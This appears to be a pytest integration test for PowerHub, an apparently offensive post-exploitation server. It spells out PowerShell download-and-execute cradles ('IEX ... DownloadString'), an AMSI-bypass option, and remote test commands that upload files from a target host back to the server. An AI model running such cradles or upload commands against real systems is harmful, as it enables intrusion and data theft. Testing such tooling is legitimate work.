#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
#  import tempfile
import re
import requests

import pytest

# https://stackoverflow.com/a/33515264/1308830
sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
from test_init import TEST_URI, TEST_COMMANDS, init_tests, execute_cmd  # noqa


MAX_TEST_MODULE_PS1 = 103

init_tests()


def get_stager():
    result = {}
    PORT = '8080'
    param_set = {
        'default': {
            "flavor": "hub",
            "GroupLauncher": "powershell",
            "GroupAmsi": "reflection",
            "GroupTransport": "http",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        },
        'HTTPS': {
            "flavor": "hub",
            "GroupLauncher": "powershell",
            "GroupAmsi": "reflection",
            "GroupTransport": "https",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        },
        'BASH': {
            "flavor": "hub",
            "GroupLauncher": "bash",
            "GroupAmsi": "reflection",
            "GroupTransport": "http",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        },
    }
    i = 0
    while i < 10:
        try:
            for k, v in param_set.items():
                result[k] = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
                                         params=v).text
            break
        except requests.exceptions.ConnectionError:
            i += 1
            time.sleep(.5)
    result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace("'",
                                                                    '\\"')
    return result


def create_modules():
    func = "function Invoke-Testfunc%(n)d { Write-Host 'Test%(n)d' }"
    from powerhub.directories import MOD_DIR
    for i in range(MAX_TEST_MODULE_PS1):
        with open(
            os.path.join(MOD_DIR, "ps1", "psmod%d.ps1" % i),
            "w"
        ) as f:
            f.write(func % {"n": i})


@pytest.fixture
def full_app():
    from powerhub import powerhub
    from powerhub import reverseproxy
    create_modules()
    powerhub.main(fully_threaded=True)
    yield get_stager()
    reverseproxy.reactor.stop()


def test_stager(full_app):
    assert full_app['default'] == (
        "$K=New-Object Net.WebClient;IEX "
        + f"$K.DownloadString('http://{TEST_URI}:8080"
        + "/0?t=http&f=h&a=reflection');"
    )
    assert full_app['HTTPS'].startswith(
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
        + "={param($1,$2);$2.Thumbprint -eq '"
    )
    assert full_app['HTTPS'].endswith(
        "'};$K=New-Object Net.WebClient;IEX $K.DownloadString"
        + f"('https://{TEST_URI}:8443/0?t=https&f=h&a=reflection');"
    )

    win10cmd = TEST_COMMANDS["win10"] % full_app
    # Insert formatter for extra command
    win10cmd = win10cmd[:-2] + '%s' + win10cmd[-2:]
    run_test_remote(lambda c: win10cmd % c.replace('"', '\\"'))

    win7cmd = TEST_COMMANDS["win7"] % full_app
    win7cmd = win7cmd.replace('\\$', '$')
    # Insert formatter for extra command
    win7cmd = win7cmd[:-3] + '%s' + win7cmd[-3:]
    run_test_remote(lambda c: win7cmd % c.replace('"', "'"))


def run_test_remote(cmd):
    out = execute_cmd(cmd(""))
    assert "Adrian Vollmer" in out
    assert "Run 'Help-PowerHub' for help" in out

    out = execute_cmd(cmd("lshm"))
    for i in range(MAX_TEST_MODULE_PS1):
        assert "psmod%d" % i in out

    out = execute_cmd(cmd("lhm psmod53|fl;Invoke-Testfunc53"))
    assert "Test53" in out
    assert "psmod53" in out
    assert re.search("Name *: ps1/psmod53.ps1\r\n", out)
    assert re.search("Type *: ps1\r\n", out)
    assert re.search("N *: 72\r\n", out)
    assert re.search("Loaded *: True\r\n", out)

    out = execute_cmd(
        cmd('$p="72-74,77";lhm $p;Invoke-Testfunc53;'
            + "Invoke-Testfunc99;Invoke-Testfunc47;Invoke-Testfunc72;")
    )
    print(out)
    # I don't understand the order of the modules
    assert "Test53" in out
    assert "Test99" in out
    assert "Test47" in out
    assert "Test72" in out

    from powerhub.directories import UPLOAD_DIR
    testfile = "testfile.dat"
    out = execute_cmd(
        cmd(('$p=-join ($env:TEMP,"\\\\%s");'
             + '[io.file]::WriteAllBytes($p,(1..255));'
             + 'pth $p;rm $p') % testfile)
    )
    time.sleep(1)
    with open(os.path.join(UPLOAD_DIR, testfile), "rb") as f:
        data = f.read()
    assert data == bytes(range(1, 256))

    out = execute_cmd(
        cmd('$p="FooBar123";$p|pth -name %s;' % testfile)
    )
    time.sleep(1)
    with open(os.path.join(UPLOAD_DIR, testfile+".1"), "rb") as f:
        data = f.read()
    assert data == b"FooBar123"
